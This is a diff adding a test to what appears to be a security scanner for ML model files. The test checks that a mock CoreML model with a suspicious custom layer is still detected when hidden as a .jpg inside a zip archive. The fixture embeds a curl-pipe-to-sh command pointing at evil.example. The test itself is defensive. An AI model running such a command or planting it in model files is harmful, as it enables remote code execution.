@@ -357,6 +357,24 @@ class TestDirectoryFileFiltering:
         assert "coreml" in results.scanner_names
         assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
 
+    def test_disguised_zip_with_renamed_coreml_member_is_scanned(self, tmp_path: Path) -> None:
+        disguised_coreml = create_mock_coreml(
+            tmp_path / "nested.jpg",
+            custom_class="EvilRuntimeLayer",
+            custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+        )
+        disguised_archive = tmp_path / "bundle.jpg"
+        with zipfile.ZipFile(disguised_archive, "w") as archive:
+            archive.write(disguised_coreml, arcname="models/model.jpg")
+        disguised_coreml.unlink()
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "zip" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
+
     def test_budget_exhausted_disguised_malicious_coreml_is_scanned(self, tmp_path: Path) -> None:
         disguised_coreml = create_mock_coreml(
             tmp_path / "budgeted.jpg",
